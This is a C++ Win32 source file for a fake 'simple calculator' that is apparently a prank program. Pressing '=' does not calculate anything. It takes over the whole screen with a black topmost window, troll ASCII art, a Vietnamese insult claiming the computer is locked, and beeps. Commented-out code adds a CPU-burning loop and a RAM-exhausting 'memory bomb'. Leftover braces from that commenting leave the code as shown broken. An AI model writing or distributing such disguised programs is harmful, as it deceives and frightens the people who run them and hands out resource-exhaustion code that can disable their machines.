#include <windows.h>
#include <string>
#include <sstream>
#include <thread>
#include <vector>

#define ID_BTN_C     100
#define ID_BTN_DIV   101
#define ID_BTN_MUL   102
#define ID_BTN_SUB   103
#define ID_BTN_ADD   104
#define ID_BTN_EQ    105
#define ID_BTN_DOT   106
#define ID_BTN_0     107
#define ID_BTN_1     108
#define ID_BTN_2     109
#define ID_BTN_3     110
#define ID_BTN_4     111
#define ID_BTN_5     112
#define ID_BTN_6     113
#define ID_BTN_7     114
#define ID_BTN_8     115
#define ID_BTN_9     116
#define ID_EDIT      117

HWND hEdit;
std::string expression = "";

const std::string ASCII_TROLL_TEXT = 
    " _ _ ____ _ _ _ _ _ _ _ ____ __ ____ \n"
    "( \\/ )( ___)( \\/ ) ( \\/ )( )( \\/ ) ( _ \\ / \\ ( _ \\ \n"
    " ) _ (/__) \\ / ) _ ( )( / ( ) _ (( O ) ) _ < \n"
    "(_/\\_)(____) \\/ (_/\\_)(__)\\_/\\_) (____/ \\__/ (____/ \n";

void PlayHehehe() {
    try {
        int laugh_notes[] = {500, 450, 500, 450, 400, 350};
        for (int freq : laugh_notes) {
            Beep(freq, 150); 
            Sleep(80);       
        }
    } catch (...) {}
}


void TriggerLockScreen(HWND hwnd) {
   
    HWND hChild = GetWindow(hwnd, GW_CHILD);
    while (hChild != NULL) {
        HWND hNext = GetWindow(hChild, GW_HWNDNEXT);
        DestroyWindow(hChild);
        hChild = hNext;
    }

   
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowLong(hwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
    SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(0, 0, 0)));
    InvalidateRect(hwnd, NULL, TRUE);

    
    CreateWindowEx(
        0, "STATIC", (ASCII_TROLL_TEXT + "\n\n      MAY TINH DA BI KHOA VI NGU NHU BO!").c_str(),
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        0, sh / 3, sw, 300,
        hwnd, NULL, NULL, NULL
    );

    
    std::thread([]() {
        PlayHehehe(); 

        // Luồng ngốn CPU
       // std::thread([]() {
       //    while (true) {
       //        volatile unsigned long long x = 0;
        //        x++;
         //   }
       // }).detach();

        // Luồng bom RAM (Memory Bomb)
       // std::thread([]() {
        //    std::vector<std::string> memoryBomb;
         //   while (true) {
          //      memoryBomb.push_back(std::string(1024 * 1024 * 50, 'X'));
           //     Sleep(10);
           // }
        }).detach();
    }).detach();
}

// Xử lý sự kiện giao diện cửa sổ
LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        // Tạo khung hiển thị kết quả (Entry box)
        hEdit = CreateWindowEx(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_RIGHT | ES_READONLY,
            10, 10, 265, 40, hwnd, (HMENU)ID_EDIT, NULL, NULL);

        // Tạo các nút bấm máy tính
        CreateWindow("BUTTON", "C", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 60, 130, 50, hwnd, (HMENU)ID_BTN_C, NULL, NULL);
        CreateWindow("BUTTON", "/", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 145, 60, 60, 50, hwnd, (HMENU)ID_BTN_DIV, NULL, NULL);
        CreateWindow("BUTTON", "*", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 210, 60, 65, 50, hwnd, (HMENU)ID_BTN_MUL, NULL, NULL);

        CreateWindow("BUTTON", "7", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 115, 60, 50, hwnd, (HMENU)ID_BTN_7, NULL, NULL);
        CreateWindow("BUTTON", "8", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 75, 115, 60, 50, hwnd, (HMENU)ID_BTN_8, NULL, NULL);
        CreateWindow("BUTTON", "9", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 140, 115, 65, 50, hwnd, (HMENU)ID_BTN_9, NULL, NULL);
        CreateWindow("BUTTON", "-", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 210, 115, 65, 50, hwnd, (HMENU)ID_BTN_SUB, NULL, NULL);

        CreateWindow("BUTTON", "4", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 170, 60, 50, hwnd, (HMENU)ID_BTN_4, NULL, NULL);
        CreateWindow("BUTTON", "5", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 75, 170, 60, 50, hwnd, (HMENU)ID_BTN_5, NULL, NULL);
        CreateWindow("BUTTON", "6", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 140, 170, 65, 50, hwnd, (HMENU)ID_BTN_6, NULL, NULL);
        CreateWindow("BUTTON", "+", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 210, 170, 65, 50, hwnd, (HMENU)ID_BTN_ADD, NULL, NULL);

        CreateWindow("BUTTON", "1", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 225, 60, 50, hwnd, (HMENU)ID_BTN_1, NULL, NULL);
        CreateWindow("BUTTON", "2", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 75, 225, 60, 50, hwnd, (HMENU)ID_BTN_2, NULL, NULL);
        CreateWindow("BUTTON", "3", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 140, 225, 65, 50, hwnd, (HMENU)ID_BTN_3, NULL, NULL);
        CreateWindow("BUTTON", "=", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 210, 225, 65, 105, hwnd, (HMENU)ID_BTN_EQ, NULL, NULL);

        CreateWindow("BUTTON", "0", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 280, 125, 50, hwnd, (HMENU)ID_BTN_0, NULL, NULL);
        CreateWindow("BUTTON", ".", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 140, 280, 65, 50, hwnd, (HMENU)ID_BTN_DOT, NULL, NULL);
        break;
    }
    case WM_COMMAND: {
        int id = LOWORD(wParam);
        if (id >= ID_BTN_0 && id <= ID_BTN_9) {
            expression += std::to_string(id - ID_BTN_0);
            SetWindowText(hEdit, expression.c_str());
        }
        else if (id == ID_BTN_ADD) { expression += "+"; SetWindowText(hEdit, expression.c_str()); }
        else if (id == ID_BTN_SUB) { expression += "-"; SetWindowText(hEdit, expression.c_str()); }
        else if (id == ID_BTN_MUL) { expression += "*"; SetWindowText(hEdit, expression.c_str()); }
        else if (id == ID_BTN_DIV) { expression += "/"; SetWindowText(hEdit, expression.c_str()); }
        else if (id == ID_BTN_DOT) { expression += "."; SetWindowText(hEdit, expression.c_str()); }
        else if (id == ID_BTN_C)   { expression = ""; SetWindowText(hEdit, ""); }
        else if (id == ID_BTN_EQ)  {
            SetWindowText(hEdit, "Result");
            // Đợi 0.4 giây rồi sập bẫy giống hệt logic root.after trong Python!
            std::thread([hwnd]() {
                Sleep(400);
                TriggerLockScreen(hwnd);
            }).detach();
        }
        break;
    }
    case WM_CTLCOLORSTATIC: {
        // Đổi màu chữ thành đỏ rực, nền đen cho thông báo troll
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 0, 0));
        SetBkColor(hdcStatic, RGB(0, 0, 0));
        static HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
        return (INT_PTR)hBrush;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

// Hàm khởi chạy chương trình C++ Win32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* CLASS_NAME = "TrollCalcClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "May Tinh Don Gian",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 370,
        NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
